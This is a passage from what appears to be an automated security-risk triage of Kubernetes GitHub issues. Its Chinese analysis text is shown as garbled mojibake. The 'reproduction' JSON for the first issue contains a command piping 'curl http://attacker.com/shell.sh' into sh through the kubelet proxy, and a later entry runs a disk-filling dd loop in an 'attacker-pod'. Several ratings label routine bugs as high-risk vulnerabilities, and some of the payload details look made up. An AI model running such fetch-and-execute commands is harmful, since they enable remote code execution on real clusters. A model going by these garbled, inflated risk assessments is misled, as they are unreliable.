REDHAT_SUPPORT_PRODUCT_VERSION=39
SUPPORT_END=2024-11-12
VARIANT="Workstation Edition"
VARIANT_ID=workstation

$ uname -a
Linux XXXXXXXX 6.10.10-100.fc39.x86_64 #1 SMP PREEMPT_DYNAMIC Thu Sep 12 16:02:41 UTC 2024 x86_64 GNU/Linux
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
é«˜é£é™©

**åˆ¤æ–­ä¾æ®ï¼š**  
è¯¥Issueæå‡ºå¸Œæœ›kube-api proxyèƒ½å¤Ÿä»£ç†åˆ°è¿è¡Œåœ¨`127.0.0.1`ä¸Šçš„kubeletï¼Œä½†ç›®å‰è¢«æ‹’ç»ï¼Œè¿”å›`address not allowed`ã€‚è¿™æ˜¯å› ä¸ºKubernetesçš„API Serveråœ¨ä»£ç†è¯·æ±‚æ—¶ï¼Œä¼šæ£€æŸ¥ç›®æ ‡èŠ‚ç‚¹çš„IPåœ°å€ï¼Œåªæœ‰å½“IPåœ°å€æ˜¯Global Unicast Addressæ—¶æ‰å…è®¸ä»£ç†ã€‚`127.0.0.1`æ˜¯æœ¬åœ°å›ç¯åœ°å€ï¼ˆLoopback Addressï¼‰ï¼Œä¸å±äºGlobal Unicast Addressï¼Œå› æ­¤è¢«æ‹’ç»ã€‚

å¦‚æœä¿®æ”¹API Serverçš„ç­–ç•¥ï¼Œå…è®¸ä»£ç†åˆ°`127.0.0.1`ï¼Œä¼šå¼•å…¥é«˜å®‰å…¨é£é™©ã€‚æ”»å‡»è€…å¯ä»¥åˆ©ç”¨è¿™ä¸€ç‚¹ï¼Œé€šè¿‡API Serverä»£ç†è¯·æ±‚æœ¬åº”ä»…åœ¨æœ¬åœ°ä¸»æœºè®¿é—®çš„æœåŠ¡ï¼Œå¦‚kubeletçš„HTTPSç«¯å£æˆ–å…¶ä»–æœ¬åœ°æœåŠ¡ï¼Œè¿›è¡Œæœªæˆæƒçš„è®¿é—®ã€‚è¿™å¯èƒ½å¯¼è‡´ä»¥ä¸‹é«˜å±åæœï¼š

1. **æœªç»æˆæƒçš„APIè®¿é—®**ï¼šæ”»å‡»è€…å¯ä»¥è®¿é—®kubeletçš„æœªç»è®¤è¯/æˆæƒçš„APIç«¯ç‚¹ï¼Œæ‰§è¡Œå¦‚è·å–å®¹å™¨ä¿¡æ¯ã€æ‰§è¡Œå‘½ä»¤ç­‰æ“ä½œã€‚

2. **å‘½ä»¤æ‰§è¡Œå’Œæƒé™æå‡**ï¼šåˆ©ç”¨æœªå—ä¿æŠ¤çš„ç«¯ç‚¹ï¼Œæ”»å‡»è€…å¯èƒ½åœ¨ä¸»æœºä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ï¼Œç”šè‡³é€ƒé€¸å‡ºå®¹å™¨ï¼Œè·å–ä¸»æœºæƒé™ã€‚

3. **SSRFæ”»å‡»**ï¼šé€šè¿‡API Serverä»£ç†ï¼Œæ”»å‡»è€…å¯ä»¥è¯·æ±‚æœ¬åœ°ä¸»æœºä¸Šçš„å…¶ä»–æœåŠ¡ï¼Œè·å–æ•æ„Ÿä¿¡æ¯æˆ–è¿›è¡Œè¿›ä¸€æ­¥çš„æ”»å‡»ã€‚

æ ¹æ®é£é™©åˆ¤æ–­æ ‡å‡†ï¼Œè§£é™¤å¯¹`127.0.0.1`çš„é™åˆ¶ï¼Œå°†å¯¼è‡´æ”»å‡»è€…èƒ½å¤Ÿåˆ©ç”¨API Serverä»£ç†è¯·æ±‚æœ¬åœ°ä¸»æœºæœåŠ¡ï¼Œå±äºé«˜é£é™©é—®é¢˜ã€‚

**å¤ç°è¿‡ç¨‹ï¼š**

```json
[
  {
    "cmd": "curl -k -H \"Authorization: Bearer $(cat /tmp/attacker_token)\" \"https://api-server:6443/api/v1/nodes/127.0.0.1/proxy/metrics\"",
    "explain": "æ”»å‡»è€…é€šè¿‡API Serverä»£ç†è¯·æ±‚ï¼Œè®¿é—®kubeletçš„`metrics`ç«¯ç‚¹ï¼Œè·å–èŠ‚ç‚¹çš„æ•æ„ŸæŒ‡æ ‡ä¿¡æ¯ã€‚"
  },
  {
    "cmd": "curl -k -H \"Authorization: Bearer $(cat /tmp/attacker_token)\" -X POST -H \"Content-Type: application/json\" -d '{\"command\": [\"/bin/sh\",\"-c\",\"curl http://attacker.com/shell.sh | sh\"]}' \"https://api-server:6443/api/v1/nodes/127.0.0.1/proxy/run/command\"",
    "explain": "æ”»å‡»è€…é€šè¿‡API Serverä»£ç†è¯·æ±‚ï¼Œè¿œç¨‹åœ¨èŠ‚ç‚¹ä¸Šæ‰§è¡Œæ¶æ„å‘½ä»¤ï¼Œä¸‹è½½å¹¶æ‰§è¡Œæ”»å‡»è€…æ§åˆ¶çš„è„šæœ¬ï¼Œå®ç°è¿œç¨‹å‘½ä»¤æ‰§è¡Œã€‚"
  }
]
```

---

## Issue #127853 NodeSwap future works incorrect on 1.30+

- Issue é“¾æ¥ï¼š[#127853](https://github.com/kubernetes/kubernetes/issues/127853)

### Issue å†…å®¹

#### What happened?

Processes inside containers do not use the swap partition, as they did before version 1.30.

#### What did you expect to happen?

Processes inside pods with QOS Burstable should use the swap partition.

#### How can we reproduce it (as minimally and precisely as possible)?

1) Create cluster on 1.30+
2) kubelet config
    ```yaml
    apiVersion: kubelet.config.k8s.io/v1beta1
      kind: KubeletConfiguration
      featureGates:
        NodeSwap: true
      memorySwap:
        swapBehavior: LimitedSwap
    ```
3) create zram partition and use it as swap (debian/ubuntu for example)
    ```bash
    apt install zram-tools
    
    cat <<EOF > /etc/default/zramswap
    ALGO=lz4
    PERCENT=100
    EOF
    
    systemctl restart zramswap.service
    sysctl vm.swappiness=100
    ```
4) On host system execute something like
    ```bash
    tail /dev/zero
    ```
    and check
    ```bash
    free -h
    ```
    When the RAM runs out, the swap partition will start to be used until the OOM-Killer kills the process.
5) Create any pod. Nginx for example
6) Execute same, but in the container
    ```bash
    tail /dev/zero
    ```
    When the RAM runs out, only a small part of the swap partition will be used. Then the OS freezes.

This was not observed in versions prior to 1.30. Working with swap was the same for both processes inside the container and for processes on the host system.

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
Client Version: v1.30.3
Kustomize Version: v5.0.4-0.20230601165947-6ce0bf390ce3
Server Version: v1.30.4+rke2r1

```

</details>


#### Cloud provider

<details>
Rancher 2.9.2 + Harvester 1.3.2
</details>


#### OS version

<details>

```console
cat /etc/os-release
PRETTY_NAME="Debian GNU/Linux 12 (bookworm)"
NAME="Debian GNU/Linux"
VERSION_ID="12"
VERSION="12 (bookworm)"
VERSION_CODENAME=bookworm
ID=debian
HOME_URL="https://www.debian.org/"
SUPPORT_URL="https://www.debian.org/support"
BUG_REPORT_URL="https://bugs.debian.org/"

uname -a
Linux jenkins-smp-branch-worker-d2c8m-bg9zt 6.1.0-25-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.106-3 (2024-08-26) x86_64 GNU/Linux
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>
```bash
./containerd --version
containerd github.com/k3s-io/containerd v1.7.20-k3s1 8d2b528ea4559e4a96b8819500241cbcba7ccc15

./runc --version
runc version 1.1.12
commit: v1.1.12-0-g51d5e946
spec: 1.0.2-dev
go: go1.22.6 X:boringcrypto
libseccomp: 2.5.4
```
</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
é«˜é£é™©

**åˆ¤æ–­ä¾æ®ï¼š**  
è¯¥Issueæè¿°äº†åœ¨Kubernetes 1.30+ç‰ˆæœ¬ä¸­ï¼Œå®¹å™¨å†…çš„è¿›ç¨‹åœ¨å†…å­˜è€—å°½æ—¶æ— æ³•æ­£ç¡®ä½¿ç”¨Swapåˆ†åŒºï¼Œå¯¼è‡´æ“ä½œç³»ç»Ÿå†»ç»“ã€‚è¿™æ„å‘³ç€ä¸€ä¸ªä½æƒé™çš„å®¹å™¨å†…ç”¨æˆ·å¯ä»¥é€šè¿‡æ¶ˆè€—å†…å­˜ï¼Œå¯¼è‡´å®¿ä¸»æœºæ“ä½œç³»ç»Ÿå†»ç»“ï¼Œå½±å“åˆ°å…¶ä»–ç”¨æˆ·å’ŒæœåŠ¡ã€‚

æ ¹æ®é£é™©åˆ¤æ–­æ ‡å‡†ï¼š

- **æ ‡å‡†1**ï¼šè¯¥é£é™©èƒ½å¤Ÿè¢«æ”»å‡»è€…åˆ©ç”¨ï¼Œæ”»å‡»è€…å¯ä»¥åœ¨å®¹å™¨å†…æ‰§è¡Œæ¶æ„è¿›ç¨‹ï¼Œæ¶ˆè€—å†…å­˜èµ„æºã€‚
- **æ ‡å‡†2**ï¼šè¯¥é£é™©æœ‰å¯èƒ½æˆä¸ºä¸€ä¸ªæ¼æ´ï¼ŒæŒ‰ç…§CVSS 3.1è¯„åˆ†æ ‡å‡†ï¼Œå½±å“ç¨‹åº¦å¯è¾¾åˆ°é«˜å±çº§åˆ«ã€‚
- **æ ‡å‡†9**ï¼šåœ¨å¤šç”¨æˆ·åœºæ™¯ä¸­ï¼Œä½æƒé™ç”¨æˆ·èƒ½å¤Ÿå½±å“åˆ°å…¶ä»–ç”¨æˆ·çš„æœåŠ¡ï¼Œåº”åˆ¤æ–­ä¸ºé«˜é£é™©ã€‚

å› æ­¤ï¼Œæ­¤é—®é¢˜å­˜åœ¨é«˜å®‰å…¨é£é™©ï¼Œå¯èƒ½å¯¼è‡´æ‹’ç»æœåŠ¡ï¼ˆDoSï¼‰æ”»å‡»ï¼Œå½±å“æ•´ä¸ªé›†ç¾¤çš„ç¨³å®šæ€§ã€‚

**å¤ç°è¿‡ç¨‹ï¼š**

```json
[
  {
    "cmd": "apt install zram-tools",
    "explain": "åœ¨ä¸»æœºä¸Šå®‰è£…zram-toolså·¥å…·"
  },
  {
    "cmd": "echo -e \\\"ALGO=lz4\\\\nPERCENT=100\\\" > /etc/default/zramswap",
    "explain": "é…ç½®zramswapï¼Œè®¾ç½®å‹ç¼©ç®—æ³•ä¸ºlz4ï¼Œä½¿ç”¨å†…å­˜çš„100%æ¥åˆ›å»ºzram"
  },
  {
    "cmd": "systemctl restart zramswap.service",
    "explain": "é‡å¯zramswapæœåŠ¡ï¼Œä½¿é…ç½®ç”Ÿæ•ˆ"
  },
  {
    "cmd": "sysctl vm.swappiness=100",
    "explain": "è®¾ç½®ç³»ç»Ÿçš„swappinesså‚æ•°ä¸º100ï¼Œåå¥½ä½¿ç”¨swap"
  },
  {
    "cmd": "tail /dev/zero",
    "explain": "åœ¨ä¸»æœºä¸Šæ‰§è¡Œå‘½ä»¤ï¼ŒæŒç»­è¯»å–é›¶è®¾å¤‡ï¼Œæ¶ˆè€—å†…å­˜ï¼Œè§‚å¯Ÿswapä½¿ç”¨æ­£å¸¸"
  },
  {
    "cmd": "free -h",
    "explain": "æŸ¥çœ‹å†…å­˜å’Œswapçš„ä½¿ç”¨æƒ…å†µï¼Œç¡®è®¤swapè¢«ä½¿ç”¨"
  },
  {
    "cmd": "kubectl run test-pod --image=nginx",
    "explain": "åˆ›å»ºä¸€ä¸ªæµ‹è¯•çš„Podï¼Œä½¿ç”¨nginxé•œåƒ"
  },
  {
    "cmd": "kubectl exec -it test-pod -- tail /dev/zero",
    "explain": "åœ¨å®¹å™¨å†…æ‰§è¡Œå‘½ä»¤ï¼ŒæŒç»­è¯»å–é›¶è®¾å¤‡ï¼Œæ¶ˆè€—å†…å­˜ï¼Œå¯¼è‡´å®¿ä¸»æœºå†…å­˜è€—å°½"
  },
  {
    "cmd": "free -h",
    "explain": "åœ¨å¦ä¸€ä¸ªç»ˆç«¯ï¼ŒæŸ¥çœ‹å†…å­˜å’Œswapçš„ä½¿ç”¨æƒ…å†µï¼Œå‘ç°swapæœªè¢«å……åˆ†ä½¿ç”¨"
  }
]
```

---

## Issue #127864 Race condition between kubelet's eviction manager and containerd's garbage collection

- Issue é“¾æ¥ï¼š[#127864](https://github.com/kubernetes/kubernetes/issues/127864)

### Issue å†…å®¹

#### What happened?

Most of the containerd eviction tests have been flaky for a long time: https://testgrid.k8s.io/sig-node-containerd#node-kubelet-containerd-eviction

While debugging these test failures, I noticed that the flaky tests are writing data to the container's writable layers instead of emptyDir volumes.  The difference between the two approach is that when a pod with emptyDir volume is evicted, all the disk space consumed by emptyDir volume is immediately freed up. In case of a pod where the data is written to the container's writable layers, the disk space is not freed up until containerd asynchronously garbage collects the content.

This causes race condition with kubelet's eviction manager because even after deleting the culprit pod, it sees that the disk space is not freed up and ends up evicting an innocent pod.

We need to investigate and fix the underlying race condition between the eviction manager and the container runtime. More information about containerd garbage collection: https://github.com/containerd/containerd/blob/main/docs/garbage-collection.md

#### What did you expect to happen?

I expected that the content to be freed up as soon as the containerd is deleted.

#### How can we reproduce it (as minimally and precisely as possible)?

containerd eviction tests would be a good starting point: https://testgrid.k8s.io/sig-node-containerd#node-kubelet-containerd-eviction

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
$ kubectl version
1.30
```

</details>


#### Cloud provider

<details>

</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
é«˜é£é™©

**åˆ¤æ–­ä¾æ®ï¼š**  
è¯¥Issueæè¿°äº†åœ¨ä½¿ç”¨containerdä½œä¸ºå®¹å™¨è¿è¡Œæ—¶çš„Kubernetesé›†ç¾¤ä¸­ï¼Œkubeletçš„é©±é€ç®¡ç†å™¨ä¸containerdçš„åƒåœ¾å›æ”¶æœºåˆ¶ä¹‹é—´å­˜åœ¨ç«æ€æ¡ä»¶ã€‚å½“ä¸€ä¸ªPodå°†æ•°æ®å†™å…¥å®¹å™¨çš„å¯å†™å±‚æ—¶ï¼Œå¦‚æœè¯¥Podè¢«é©±é€ï¼Œcontainerdä¸ä¼šç«‹å³é‡Šæ”¾å…¶å ç”¨çš„ç£ç›˜ç©ºé—´ï¼Œè€Œæ˜¯é€šè¿‡å¼‚æ­¥åƒåœ¾å›æ”¶æ¥é‡Šæ”¾ã€‚è¿™å¯¼è‡´kubeletçš„é©±é€ç®¡ç†å™¨åœ¨åˆ é™¤é—®é¢˜Podåï¼Œä»æ£€æµ‹åˆ°ç£ç›˜å‹åŠ›ï¼Œå¯èƒ½è¿›ä¸€æ­¥é”™è¯¯åœ°é©±é€å…¶ä»–æ— è¾œçš„Podã€‚

åœ¨å¤šç”¨æˆ·åœºæ™¯ä¸‹ï¼Œä½æƒé™ç”¨æˆ·å¯ä»¥åˆ©ç”¨æ­¤ç«æ€æ¡ä»¶ï¼Œé€šè¿‡åœ¨å…¶å®¹å™¨çš„å¯å†™å±‚å¤§é‡å†™å…¥æ•°æ®ï¼Œåˆ¶é€ ç£ç›˜å‹åŠ›ã€‚å³ä½¿å…¶Podè¢«é©±é€ï¼Œç£ç›˜ç©ºé—´ä¹Ÿä¸ä¼šç«‹å³é‡Šæ”¾ï¼Œå¯¼è‡´å…¶ä»–ç”¨æˆ·çš„Podï¼ˆå¯èƒ½å…·æœ‰ç›¸åŒæˆ–æ›´é«˜æƒé™ï¼‰è¢«é©±é€ã€‚è¿™æ˜¯ä¸€ç§æ‹’ç»æœåŠ¡ï¼ˆDoSï¼‰æ”»å‡»ã€‚

æ ¹æ®é£é™©åˆ¤æ–­æ ‡å‡†ç¬¬9æ¡ï¼Œæ­¤é—®é¢˜å…è®¸ä½æƒé™ç”¨æˆ·å½±å“å…¶ä»–ç”¨æˆ·çš„æœåŠ¡ï¼Œåº”åˆ¤æ–­ä¸ºé«˜é£é™©ã€‚å¹¶ä¸”ï¼Œæ ¹æ®CVSS 3.1è¯„åˆ†æ ‡å‡†ï¼š

- æ”»å‡»å‘é‡ï¼ˆAVï¼‰ï¼šç½‘ç»œï¼ˆNï¼‰â€”æ”»å‡»è€…å¯ä»¥é€šè¿‡ç½‘ç»œè®¿é—®ã€‚
- æ”»å‡»å¤æ‚åº¦ï¼ˆACï¼‰ï¼šä½ï¼ˆLï¼‰â€”æ”»å‡»ä¸éœ€è¦ç‰¹æ®Šæ¡ä»¶ã€‚
- æƒé™è¦æ±‚ï¼ˆPRï¼‰ï¼šä½ï¼ˆLï¼‰â€”æ”»å‡»è€…åªéœ€å…·å¤‡åˆ›å»ºPodçš„æƒé™ã€‚
- ç”¨æˆ·äº¤äº’ï¼ˆUIï¼‰ï¼šæ— ï¼ˆNï¼‰â€”ä¸éœ€è¦å…¶ä»–ç”¨æˆ·çš„äº¤äº’ã€‚
- ä½œç”¨åŸŸï¼ˆSï¼‰ï¼šæ”¹å˜ï¼ˆCï¼‰â€”æ”»å‡»å½±å“åˆ°å…¶ä»–ç”¨æˆ·çš„èµ„æºã€‚
- æœºå¯†æ€§ï¼ˆCï¼‰ï¼šæ— ï¼ˆNï¼‰ã€‚
- å®Œæ•´æ€§ï¼ˆIï¼‰ï¼šæ— ï¼ˆNï¼‰ã€‚
- å¯ç”¨æ€§ï¼ˆAï¼‰ï¼šé«˜ï¼ˆHï¼‰â€”å¯¼è‡´å…¶ä»–Podè¢«é©±é€ï¼ŒæœåŠ¡ä¸å¯ç”¨ã€‚

ç»¼åˆè¯„åˆ†ï¼Œè¯¥æ¼æ´çš„CVSSè¯„åˆ†ä¸ºé«˜ï¼ˆHighï¼‰ã€‚å› æ­¤ï¼Œæ­¤Issueå­˜åœ¨é«˜å®‰å…¨é£é™©ã€‚

**å¤ç°è¿‡ç¨‹ï¼š**

```json
[
  {
    "cmd": "kubectl create ns attacker-namespace",
    "explain": "åˆ›å»ºä¸€ä¸ªåä¸º attacker-namespace çš„å‘½åç©ºé—´ã€‚"
  },
  {
    "cmd": "kubectl run attacker-pod -n attacker-namespace --image=busybox --restart=Never -- sh -c \"while true; do dd if=/dev/zero of=fillfile bs=10M count=100; done\"",
    "explain": "åœ¨ attacker-namespace ä¸­åˆ›å»ºä¸€ä¸ªåä¸º attacker-pod çš„Podï¼Œä¸æ–­åœ°å‘å®¹å™¨çš„å¯å†™å±‚å†™å…¥æ•°æ®ã€‚"
  },
  {
    "cmd": "kubectl get pods -n attacker-namespace",
    "explain": "æ£€æŸ¥æ”»å‡»è€…Podçš„çŠ¶æ€ï¼Œç¡®ä¿å…¶æ­£åœ¨è¿è¡Œã€‚"
  },
  {
    "cmd": "kubectl get nodes",
    "explain": "è·å–é›†ç¾¤ä¸­æ‰€æœ‰èŠ‚ç‚¹çš„åç§°ï¼Œä»¥ä¾¿åç»­æŸ¥çœ‹èŠ‚ç‚¹çŠ¶æ€ã€‚"
  },
  {
    "cmd": "kubectl describe node <NODE_NAME>",
    "explain": "æŸ¥çœ‹æŒ‡å®šèŠ‚ç‚¹çš„è¯¦ç»†ä¿¡æ¯ï¼Œç›‘æ§ç£ç›˜å‹åŠ›æƒ…å†µï¼ˆå°† <NODE_NAME> æ›¿æ¢ä¸ºå®é™…çš„èŠ‚ç‚¹åç§°ï¼‰ã€‚"
  },
  {
    "cmd": "kubectl get events --all-namespaces | grep 'Evicted'",
    "explain": "æ£€æŸ¥æ˜¯å¦æœ‰å…¶ä»–å‘½åç©ºé—´çš„Podè¢«é©±é€ã€‚"
  },
  {
    "cmd": "kubectl get pods -A --field-selector=status.phase=Failed",
    "explain": "è·å–æ‰€æœ‰çŠ¶æ€ä¸ºFailedçš„Podï¼Œç¡®è®¤å“ªäº›Podè¢«é©±é€ã€‚"
  }
]
```

---

# âš ï¸ å­˜åœ¨ä½é£é™©çš„ Issues (16 ä¸ª)

## Issue #128408 liveness or readiness probes timeout does not work

- Issue é“¾æ¥ï¼š[#128408](https://github.com/kubernetes/kubernetes/issues/128408)

### Issue å†…å®¹

#### What happened?

When executing livenessProbe exec command, timeoutSeconds does not work.
timeoutSeconds: 5
periodSeconds: 30
exec command: /opt/entrypoint.sh healthcheck ,healthcheck will request a url without timeout. When this URL does not respond, a liveness request is received approximately every 2 minutes.


#### What did you expect to happen?

When this URL does not respond, liveness request timed out after 5 seconds.

#### How can we reproduce it (as minimally and precisely as possible)?

Maybe sleep 120s in command, timeoutSeconds: 5, periodSeconds: 30

#### Anything else we need to know?

livenessProbe config:
```
  livenessProbe:
        exec:
          command:
            - /opt/entrypoint.sh
            - healthcheck
        initialDelaySeconds: 30
        timeoutSeconds: 5
        periodSeconds: 30
        successThreshold: 1
        failureThreshold: 12
      readinessProbe:
        exec:
          command:
            - /opt/entrypoint.sh
            - healthcheck
        initialDelaySeconds: 30
        timeoutSeconds: 5
        periodSeconds: 30
        successThreshold: 1
        failureThreshold: 12
```

#### Kubernetes version

<details>

```
Server Version: version.Info{Major:"1", Minor:"29+", GitVersion:"v1.29.8-eks-a737599", GitCommit:"3277d87d88d0bf66b6368ce57e49b2f2aab01b0d", GitTreeState:"clean", BuildDate:"2024-08-26T21:27:41Z", GoVersion:"go1.22.5", Compiler:"gc", Platform:"linux/amd64"}
```

</details>


#### Cloud provider

<details>
AWS eks
</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
ä½é£é™©

**åˆ¤æ–­ä¾æ®ï¼š**  
è¯¥Issueæè¿°äº†åœ¨Kubernetesä¸­ï¼Œ`livenessProbe`çš„`exec`å‘½ä»¤çš„`timeoutSeconds`å‚æ•°ä¸èµ·ä½œç”¨ï¼Œå¯¼è‡´å½“`exec`å‘½ä»¤é˜»å¡æ—¶ï¼Œæ¢é’ˆä¸ä¼šåœ¨æŒ‡å®šçš„è¶…æ—¶æ—¶é—´åè¶…æ—¶ã€‚è¿™å¯èƒ½ä¼šå¯¼è‡´Podæ— æ³•åŠæ—¶é‡å¯ï¼Œå½±å“æœåŠ¡çš„å¯ç”¨æ€§ã€‚

ä»å®‰å…¨è§’åº¦æ¥çœ‹ï¼Œå¦‚æœæ”»å‡»è€…èƒ½å¤Ÿæ§åˆ¶`healthcheck`è¯·æ±‚çš„URLï¼Œå¹¶ä½¿å…¶ä¸å“åº”ï¼Œå¯èƒ½ä¼šå¯¼è‡´Podä¸€ç›´å¤„äºä¸å¥åº·çŠ¶æ€ï¼Œé€ æˆæ‹’ç»æœåŠ¡ï¼ˆDoSï¼‰æ”»å‡»ã€‚ç„¶è€Œï¼Œè¿™éœ€è¦æ”»å‡»è€…èƒ½å¤Ÿæ§åˆ¶æˆ–å½±å“`healthcheck`çš„ç›®æ ‡URLï¼Œæˆ–è€…åœ¨ç½‘ç»œå±‚é¢ä¸Šè¿›è¡Œå¹²æ‰°ã€‚ç”±äºè¯¥æ”»å‡»éœ€è¦ä¸€å®šçš„æ¡ä»¶ï¼Œä¸”å¯¹ç³»ç»Ÿçš„å½±å“æœ‰é™ï¼Œé£é™©è¯„çº§åœ¨`high`ä»¥ä¸‹ï¼Œåˆ¤æ–­ä¸ºä½é£é™©ã€‚

---

## Issue #128339 When containers use memory backed tmpfs and hit a OOM limit they will keep OOM on restarts.

- Issue é“¾æ¥ï¼š[#128339](https://github.com/kubernetes/kubernetes/issues/128339)

### Issue å†…å®¹

#### What happened?

While aiming to promote SizeMemoryBackedVolumes to stable, tim brought up a point about what would happen if a pod that hit a OOM due to tmpfs memory limits would keep OOM as the pages are still kept around.

He is correct. If a pod hits a OOM limit with tmpfs it will keep OOM and never purge that memory

#### What did you expect to happen?

I would expect the tmpfs to be empty on a restart of the container.

#### How can we reproduce it (as minimally and precisely as possible)?

I used kind 1.30.

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: example
  labels:
    app: test-pd
spec:
  restartPolicy: OnFailure
  securityContext:
    seccompProfile:
      type: RuntimeDefault
  containers:
  - image: busybox
    command:
      - /bin/sh
      - -c
      - |
         sleep infinity
    name: test-pd
    resources:
      limits:
        memory: 2Gi
    volumeMounts:
    - mountPath: /dev/shm
      name: dshm
    securityContext:
      allowPrivilegeEscalation: false
      capabilities:
        drop:
        - ALL
  volumes:
  - name: dshm
    emptyDir:
      medium: Memory
      sizeLimit: 4Gi
```

kubectl exec -it example -- sh
cd /dev/shm/
dd if=/dev/zero of=filename bs=1024 count=2GB
command terminated with exit code 137

In this case, the pod is unable to start again and it gets stuck with:

```
7s          Warning   Failed                    pod/example               Error: failed to create containerd task: failed to create shim task: OCI runtime create failed: runc create failed: unable to start container process: container init was OOM-killed (memory limit too low?): unknown
```

#### Anything else we need to know?

This is probably a long outstanding issue so its unclear if this will be fixed as a bug.

#### Kubernetes version

<details>

```console
$ kubectl version
1.30
```

</details>


#### Cloud provider

<details>
na
</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
ä½é£é™©

**åˆ¤æ–­ä¾æ®ï¼š**  
è¯¥Issueæè¿°äº†å½“å®¹å™¨ä½¿ç”¨å†…å­˜æ”¯æŒçš„tmpfså¹¶è¾¾åˆ°OOMï¼ˆå†…å­˜ä¸è¶³ï¼‰é™åˆ¶æ—¶ï¼Œå³ä½¿é‡å¯ä¹Ÿä¼šæŒç»­å‘ç”ŸOOMçš„é—®é¢˜ã€‚å…·ä½“æ¥è¯´ï¼Œå®¹å™¨åœ¨tmpfsä¸­åˆ›å»ºäº†å¤§æ–‡ä»¶ï¼Œå¯¼è‡´å†…å­˜è€—å°½ï¼Œå®¹å™¨å´©æºƒã€‚ä½†æ˜¯ï¼Œç”±äºtmpfsçš„å†…å®¹åœ¨å®¹å™¨é‡å¯åä»ç„¶ä¿ç•™ï¼Œå¯¼è‡´å®¹å™¨æ— æ³•é‡æ–°å¯åŠ¨ï¼ŒæŒç»­å‡ºç°OOMã€‚

æ ¹æ®é£é™©åˆ¤æ–­æ ‡å‡†ï¼š

1. **æ”»å‡»è€…åˆ©ç”¨æ€§**ï¼šè¦è§¦å‘æ­¤é—®é¢˜ï¼Œéœ€è¦æ”»å‡»è€…åœ¨å®¹å™¨å†…éƒ¨æ‰§è¡Œå‘½ä»¤å†™å…¥å¤§é‡æ•°æ®åˆ°tmpfsã€‚è¿™è¦æ±‚æ”»å‡»è€…å…·æœ‰å®¹å™¨å†…çš„å†™æƒé™æˆ–å‘½ä»¤æ‰§è¡Œæƒé™ã€‚

4. **æƒé™è¦æ±‚é™ä½é£é™©è¯„çº§**ï¼šç”±äºéœ€è¦æ”»å‡»è€…å…·å¤‡éåªè¯»æƒé™ï¼ˆå†™æƒé™æˆ–å‘½ä»¤æ‰§è¡Œæƒé™ï¼‰ï¼Œæ ¹æ®æ ‡å‡†ï¼Œæ­¤ç±»æ‹’ç»æœåŠ¡ï¼ˆDoSï¼‰æ”»å‡»çš„é£é™©è¯„çº§åº”é™ä½ï¼Œä¸åº”åˆ¤æ–­ä¸ºé«˜é£é™©ï¼ŒCVSSè¯„çº§åœ¨highä»¥ä¸‹ã€‚

9. **å¤šç”¨æˆ·åœºæ™¯å½±å“**ï¼šè¯¥é—®é¢˜å½±å“çš„æ˜¯å®¹å™¨è‡ªèº«ï¼Œæ²¡æœ‰è¯æ®è¡¨æ˜ä½æƒé™ç”¨æˆ·å¯ä»¥é€šè¿‡æ­¤é—®é¢˜å½±å“åŒçº§æˆ–æ›´é«˜æƒé™çš„å…¶ä»–ç”¨æˆ·æˆ–å®¹å™¨ã€‚

å› æ­¤ï¼Œæ ¹æ®ä»¥ä¸Šåˆ†æï¼Œæ­¤Issueå­˜åœ¨å®‰å…¨é£é™©ï¼Œä½†é£é™©è¯„çº§åœ¨highä»¥ä¸‹ï¼Œåˆ¤æ–­ä¸ºä½é£é™©ã€‚

---

## Issue #128304 node_lifecycle_controller accidentally removes newly tainted node taints when trying to remove some old taints

- Issue é“¾æ¥ï¼š[#128304](https://github.com/kubernetes/kubernetes/issues/128304)

### Issue å†…å®¹

#### What happened?

In my case, our program will try to taint a newly joined master node with our customed taint "node-role.kubernetes.io/master:NoSchedule"
But the taint wasn't there in one of our test case.
After looking into the logs, we found that kube-controller-manager was the most suspicious component.
Kube-controller-manager would update node taint when node gets ready, and it just happened when we tainted the node with kubectl
![image](https://github.com/user-attachments/assets/af5ff6a3-145c-45d4-a738-536430dc47bc)
![image](https://github.com/user-attachments/assets/b594dd1d-ed5d-4bde-821d-97a5af4b16d2)
Then we looked into the code, and found the problem in pkg/controller/controller_utils.go
https://github.com/kubernetes/kubernetes/blob/aa8f2878a588d80b0dc7960c0b82af1882011115/pkg/controller/controller_utils.go#L1115
When it tries to remove a taint, it uses Patch, which would lost the taints tainted by others during Get to Patch



#### What did you expect to happen?

The taint should not be lost

#### How can we reproduce it (as minimally and precisely as possible)?

Modify the code, make some Pause between Get and Patch (sleep() .etc) in function RemoveTaintOffNode
Stop the kubelet on one node, to create not-ready condition
